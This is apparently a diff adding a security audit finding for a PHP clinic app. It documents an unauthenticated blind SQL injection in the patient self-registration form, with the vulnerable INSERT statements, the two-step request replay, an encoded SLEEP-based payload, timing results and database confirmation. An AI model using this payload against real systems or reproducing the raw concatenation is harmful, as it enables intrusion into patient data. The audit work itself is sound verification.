@@ -1,0 +1,27 @@
+EDOC-01: Unauthenticated blind INSERT SQLi in patient self-registration
+Sink: create-account.php:68 "insert into patient(pemail,pname,ppassword,paddress,pnic,pdob,ptel)
+      values('$email','$name','$newpassword','$address','$nic','$dob','$tele');"
+      and :69 "insert into webuser values('$email','p')"
+Entry: POST /create-account.php (newemail, newpassword, cpassword, tele)
+
+[Correction vs audit] fname/lname/address/nic/dob come from $_SESSION['personal'] set by
+signup.php (step 1 of the 2-step registration), NOT from POST on create-account.php.
+Injectable POST fields here: newemail, newpassword, tele. All are raw-concatenated.
+
+Setup: 2-step flow replayed with a cookie jar:
+    step 1: POST /signup.php  fname=Night&lname=Tester&address=1 Test St&nic=987654321&dob=2000-01-01
+            -> HTTP 302 (session sets _SESSION['personal'])
+    step 2 (baseline): POST /create-account.php newemail=clean1@test.local&newpassword=x123&cpassword=x123&tele=999
+            -> HTTP 302 in 0.017s; patient + webuser rows created normally
+
+    step 2 (payload):  POST /create-account.php newemail=1%27%2B%28SELECT%20SLEEP%285%29%29%2B%271&newpassword=x123&cpassword=x123&tele=999
+            (decodes to newemail = 1'+(SELECT SLEEP(5))+'1 ; numeric-string arithmetic
+             avoids MySQL strict-mode error 1292 that non-numeric operands would raise)
+            -> HTTP 302 in 10.049s
+            (2 x SLEEP(5): BOTH the patient INSERT (L68) and the webuser INSERT (L69)
+             evaluate the injected $email expression)
+
+    DB proof: SELECT pemail,pname,ppassword,ptel FROM patient WHERE pemail='2'
+              -> 2 | Night Tester | x123 | 999   (pemail stores evaluated expression = 2)
+              SELECT * FROM webuser WHERE email='2'
+              -> 2 | p                            (L69 sink confirmed too)
